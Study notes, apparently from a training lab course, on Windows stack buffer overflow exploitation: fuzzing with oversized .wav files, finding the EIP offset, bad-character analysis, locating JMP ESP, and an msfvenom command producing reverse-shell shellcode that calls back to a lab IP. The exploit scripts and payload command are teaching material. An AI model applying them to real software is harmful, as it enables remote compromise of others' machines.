
ROP- Return Oriented program
Egg hunting
SEH - Structured Exception Handling

Debugging Tools, like Immunity Debugger, OllyDBG, WinGDB, or IDA Pro. However, these debuggers are either outdated (Immunity/OllyDBG) or need a pro license to use (WinGDB/IDA).

Here we are using this for the course x64dbg
mona.py --> ERC.Xdbg

For stack-based buffer overflow exploitation, we usually follow four main steps to identify and exploit the buffer overflow vulnerability:

Fuzzing Parameters
Controlling EIP
Identifying Bad Characters
Finding a Return Instruction
Jumping to Shellcode

we prefer attaching to a process

Certain file types tend to cause overflow vulnerabilities, like .wav files or .m3u files, due to the vulnerabilities in the libraries that process these types of files.


Fuzzing Text Fields

creating a very large text payload, like 10,000 characters, and input them into our field

cmd: python -c "print('A'*10000)"

python -c "print('A'*10000, file=open('fuzz.wav', 'w'))"


As we can see, we indeed overwrote both EBP and EIP, and then the program tried to execute our overwritten EIP address.


Controlling EIP

ERC --pattern c 5000

def eip_offset():
    payload = bytes("Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac"
                    ...SNIP...
                    "Gi3Gi4Gi5Gi6Gi7Gi8Gi9Gj0Gj1Gj2Gj3Gj4Gj5Gj6Gj7Gj8Gj9Gk0Gk1Gk2Gk3Gk4Gk5Gk",
					"utf-8")
   with open('pattern.wav', 'wb') as f:
        f.write(payload)
eip_offset()


ERC --pattern o B5eB 

Controlling EIP

def eip_control():
    offset = 4112
    buffer = b"A"*offset
    eip = b"B"*4
    payload = buffer + eip
    
    with open('control.wav', 'wb') as f:
        f.write(payload)

eip_control()


Identifying Bad Characters

if our payload included a null byte, the program may stop processing our shellcode
the new line \n and carriage return \r


ERC --bytearray //it will generate the badchar in the tool logs


def bad_chars():
    all_chars = bytes([
        0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07,
    	0x08, 0x09, 0x0A, 0x0B, 0x0C, 0x0D, 0x0E, 0x0F,
    	0x10, 0x11, 0x12, 0x13, 0x14, 0x15, 0x16, 0x17,
    	0x18, 0x19, 0x1A, 0x1B, 0x1C, 0x1D, 0x1E, 0x1F,
    	0x20, 0x21, 0x22, 0x23, 0x24, 0x25, 0x26, 0x27,
    	0x28, 0x29, 0x2A, 0x2B, 0x2C, 0x2D, 0x2E, 0x2F,
    	0x30, 0x31, 0x32, 0x33, 0x34, 0x35, 0x36, 0x37,
   	0x38, 0x39, 0x3A, 0x3B, 0x3C, 0x3D, 0x3E, 0x3F,
    	0x40, 0x41, 0x42, 0x43, 0x44, 0x45, 0x46, 0x47,
   	0x48, 0x49, 0x4A, 0x4B, 0x4C, 0x4D, 0x4E, 0x4F,
    	0x50, 0x51, 0x52, 0x53, 0x54, 0x55, 0x56, 0x57,
    	0x58, 0x59, 0x5A, 0x5B, 0x5C, 0x5D, 0x5E, 0x5F,
    	0x60, 0x61, 0x62, 0x63, 0x64, 0x65, 0x66, 0x67,
    	0x68, 0x69, 0x6A, 0x6B, 0x6C, 0x6D, 0x6E, 0x6F,
    	0x70, 0x71, 0x72, 0x73, 0x74, 0x75, 0x76, 0x77,
    	0x78, 0x79, 0x7A, 0x7B, 0x7C, 0x7D, 0x7E, 0x7F,
    	0x80, 0x81, 0x82, 0x83, 0x84, 0x85, 0x86, 0x87,
    	0x88, 0x89, 0x8A, 0x8B, 0x8C, 0x8D, 0x8E, 0x8F,
    	0x90, 0x91, 0x92, 0x93, 0x94, 0x95, 0x96, 0x97,
    	0x98, 0x99, 0x9A, 0x9B, 0x9C, 0x9D, 0x9E, 0x9F,
    	0xA0, 0xA1, 0xA2, 0xA3, 0xA4, 0xA5, 0xA6, 0xA7,
    	0xA8, 0xA9, 0xAA, 0xAB, 0xAC, 0xAD, 0xAE, 0xAF,
    	0xB0, 0xB1, 0xB2, 0xB3, 0xB4, 0xB5, 0xB6, 0xB7,
    	0xB8, 0xB9, 0xBA, 0xBB, 0xBC, 0xBD, 0xBE, 0xBF,
    	0xC0, 0xC1, 0xC2, 0xC3, 0xC4, 0xC5, 0xC6, 0xC7,
    	0xC8, 0xC9, 0xCA, 0xCB, 0xCC, 0xCD, 0xCE, 0xCF,
    	0xD0, 0xD1, 0xD2, 0xD3, 0xD4, 0xD5, 0xD6, 0xD7,
    	0xD8, 0xD9, 0xDA, 0xDB, 0xDC, 0xDD, 0xDE, 0xDF,
    	0xE0, 0xE1, 0xE2, 0xE3, 0xE4, 0xE5, 0xE6, 0xE7,
    	0xE8, 0xE9, 0xEA, 0xEB, 0xEC, 0xED, 0xEE, 0xEF,
    	0xF0, 0xF1, 0xF2, 0xF3, 0xF4, 0xF5, 0xF6, 0xF7,
    	0xF8, 0xF9, 0xFA, 0xFB, 0xFC, 0xFD, 0xFE, 0xFF
    ])
    
    offset = 4112
    buffer = b"A"*offset
    eip = b"B"*4
    payload = buffer + eip + all_chars
    
    with open('chars.wav', 'wb') as f:
        f.write(payload)

bad_chars()



ERC --compare 0014F974 C:\Users\htb-student\Desktop\ByteArray_1.bin // compare the badchars from the input with we have given and memory

But here 0x00 is not bad

Eliminating the badchar and regenrating the new badchars

ERC --bytearray -bytes 0x00 // regenerating the badchar after found 1 char as bad and excluding the same in next new badchars

ERC --compare 0014F974 C:\Users\htb-student\Desktop\ByteArray_2.bin
ERC --compare 0102FB48 C:\Users\htb-student\Desktop\ByteArray_4.bin


Finding a Return Instruction

Address Space Layout Randomization (ASLR)

more advanced binary exploitation methods like ROP

we will utilize a method known as Jumping to Stack.
Using a JMP ESP instruction

Before we continue, we must note that this method DOES NOT work with modern machines, as we have mentioned previously, and it is considered a legacy method of exploitation.

Modern systems and programs are compiled with the NX bit on the stack or the DEP memory protection in Windows

ASLR - Address Space Layout Randomazation

Jumping to Stack

ERC --ModuleInfo

If we only consider files with False set to all protections,

ERC --ModuleInfo -NXCompat

we can go to the CPU tab and right-click then select Search For>All Modules>Command, and enter the JMP ESP, and we will get a list of JMP ESP instructions in loaded modules

find the actual exe file

jmp esp
54C3
PUSH ESP; RET




Clicking sysmbols or hitting alt+e

We can start with cdextract.exe and double-click it to open view and search its instructions. To search for the JMP ESP instruction within the instructions of this file, we can click ctrl+f, which allows us to search for any instruction within the opened file cdextract.exe:



Note: We can also search for CALL ESP, which will also jump to the stack.

Payload generation

msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.41 LPORT=1234 -f 'python' -b '\x00\x0A\x0D'




